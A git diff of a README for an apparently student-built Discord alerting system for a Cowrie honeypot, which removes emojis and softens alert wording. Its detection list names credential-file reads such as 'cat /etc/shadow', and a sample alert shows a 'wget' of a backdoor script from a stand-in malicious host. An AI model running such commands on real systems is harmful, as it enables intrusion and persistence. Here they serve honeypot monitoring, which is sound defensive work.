@@ -1,10 +1,10 @@
 # CerberusMesh Discord Monitoring System
 
-## 🍯 Real-Time Honeypot Alerts for AIT670 Team Project
+## Real-Time Honeypot Alerts for AIT670 Team Project
 
-This enhanced monitoring system provides instant Discord notifications when attackers interact with your Cowrie honeypot, complete with threat intelligence, session tracking, and PCAP conversion capabilities.
+This enhanced monitoring system provides instant Discord notifications when attackers interact with the Cowrie honeypot, complete with threat intelligence, session tracking, and PCAP conversion capabilities.
 
-## ⚡ Quick Start
+## Quick Start
 
 ### 1. Create Discord Webhook
 - Go to your Discord server → Channel settings → Integrations → Create Webhook
@@ -23,11 +23,11 @@ sudo ./deploy_enhanced_discord_monitor.sh
 
 ### 3. Enhanced Features Automatically Configured
 The enhanced deployment script automatically:
-- ✅ Creates comprehensive monitoring with threat detection
-- ✅ Sets up PCAP conversion capabilities  
-- ✅ Configures team collaboration features
-- ✅ Implements rate limiting and spam protection
-- ✅ Creates management tools and utilities
+- Creates comprehensive monitoring with threat detection
+- Sets up PCAP conversion capabilities  
+- Configures team collaboration features
+- Implements rate limiting and spam protection
+- Creates management tools and utilities
 
 ### 4. Verify Deployment
 ```bash
@@ -41,30 +41,30 @@ cd /opt/cowrie/discord-monitor && python3 test_webhook.py
 sudo journalctl -u cowrie-discord-monitor -f
 ```
 
-## 🎯 Alert Types
+## Alert Types
 
 | Alert | Color | Description | Action Required |
 |-------|--------|-------------|-----------------|
-| 🚨 **Successful Login** | Red | Attacker broke in! | **Immediate investigation** |
-| 📤 **File Upload** | Red | Malware installation attempt | **Immediate analysis** |
-| ⚠️ **Suspicious Command** | Orange | Interesting attacker behavior | Document techniques |
-| 📥 **File Download** | Orange | Data theft attempt | Monitor activity |
-| 🔒 **Failed Login** | Blue | Normal brute force | Track patterns |
-| 💻 **Command Executed** | Blue | Basic system exploration | Optional review |
+| **Successful Login** | Red | Authentication successful | **Immediate investigation** |
+| **File Upload** | Red | File upload detected | **Immediate analysis** |
+| **Suspicious Command** | Orange | Notable attacker behavior | Document techniques |
+| **File Download** | Orange | File download attempt | Monitor activity |
+| **Failed Login** | Blue | Authentication failure | Track patterns |
+| **Command Executed** | Blue | Command execution | Optional review |
 
-## 🛠️ Configuration
+## Configuration
 
 ### Alert Levels (discord_config.json)
 ```json
 {
   "alert_levels": {
-    "login_success": true,     // 🚨 Critical - always enable
-    "login_failed": false,     // Can be spammy
+    "login_success": true,     // Critical - recommended to enable
+    "login_failed": false,     // High volume potential
     "command_executed": true,  // Useful for analysis
-    "file_upload": true,       // 🚨 Critical - always enable
-    "file_download": true,     // Important for data theft detection
-    "session_start": false,    // Usually too noisy
-    "session_end": false       // Not usually needed
+    "file_upload": true,       // Critical - recommended to enable
+    "file_download": true,     // Important for data monitoring
+    "session_start": false,    // High volume potential
+    "session_end": false       // Not typically required
   }
 }
 ```
@@ -77,7 +77,7 @@ The system flags these commands as high-priority:
 - **System Access**: `cat /etc/passwd`, `cat /etc/shadow`
 - **Persistence**: `crontab`, `systemctl`, `service`
 
-## 📋 Team Workflows
+## Team Workflows
 
 ### Discord Channel Setup
 - **#honeypot-alerts** - All automated alerts
@@ -85,12 +85,12 @@ The system flags these commands as high-priority:
 - **#honeypot-discussion** - Team analysis and findings
 
 ### Response Procedures
-1. **See an alert** → React with 👀 (acknowledged)
-2. **Critical alert** → Investigate immediately
-3. **Document findings** → Share in discussion channel
-4. **Update threat database** → Record new attack patterns
+1. **See an alert** - Acknowledge receipt
+2. **Critical alert** - Investigate immediately
+3. **Document findings** - Share in discussion channel
+4. **Update threat database** - Record new attack patterns
 
-## 🔧 Management Commands
+## Management Commands
 
 ```bash
 # Service Management
@@ -108,7 +108,7 @@ sudo -u cowrie python3 /opt/cowrie/discord-monitor/test_webhook.py
 sudo -u cowrie /opt/cowrie/discord-monitor/start_monitor.sh
 ```
 
-## 🛡️ Security Features
+## Security Features
 
 - **Secure Configuration**: Webhook URLs stored with restricted permissions
 - **User Isolation**: Runs as unprivileged `cowrie` user
@@ -116,12 +116,12 @@ sudo -u cowrie /opt/cowrie/discord-monitor/start_monitor.sh
 - **Log Rotation**: Automatic cleanup of old logs
 - **Git Protection**: Webhook URLs excluded from version control
 
-## 📊 Sample Alerts
+## Sample Alerts
 
 ### Successful Login Alert
 ```
-🚨 SUCCESSFUL LOGIN DETECTED!
-Attacker successfully logged in!
+SUCCESSFUL LOGIN DETECTED
+Authentication successful
 
 IP Address: 192.168.1.100
 Username: admin
@@ -133,7 +133,7 @@ Credentials: admin:admin123
 
 ### Suspicious Command Alert
 ```
-⚠️ SUSPICIOUS COMMAND EXECUTED!
+SUSPICIOUS COMMAND EXECUTED
 Command: wget http://malicious.com/backdoor.sh
 
 Source IP: 192.168.1.100
@@ -147,8 +147,8 @@ wget http://malicious.com/backdoor.sh
 
 ### File Upload Alert
 ```
-📤 FILE UPLOAD DETECTED!
-Attacker uploaded a file!
+FILE UPLOAD DETECTED
+File upload activity detected
 
 Filename: backdoor.py
 Source IP: 192.168.1.100
@@ -158,7 +158,7 @@ Source IP: 192.168.1.100
 Action: Uploaded
 ```
 
-## 🚀 Advanced Features
+## Advanced Features
 
 ### Multiple Webhook Channels
 ```json
@@ -174,7 +174,7 @@ Action: Uploaded
 "ignored_ips": ["10.0.0.0/8", "internal.scanner.ip"]
 ```
 
-## 🔍 Troubleshooting
+## Troubleshooting
 
 ### Common Issues
 
